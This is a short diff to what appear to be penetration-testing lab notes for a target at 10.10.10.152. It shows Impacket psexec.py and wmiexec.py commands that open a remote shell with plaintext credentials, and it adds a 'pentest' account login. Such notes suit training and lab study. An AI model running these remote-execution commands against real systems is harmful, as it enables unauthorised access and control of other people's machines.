@@ -129,7 +129,9 @@ pip install .
 
 
 psexec.py
-psexec.py prtgadmin:'PrTg@dmin2019'@10.10.10.152                                1 ⨯
+psexec.py prtgadmin:'PrTg@dmin2019'@10.10.10.152                              
+psexec.py pentest:'P3nT3st!'@10.10.10.152                                
+wmiexec.py pentest:'P3nT3st!'@10.10.10.152                                
 
 also exist (wmiexec.py
 smbexec.py)
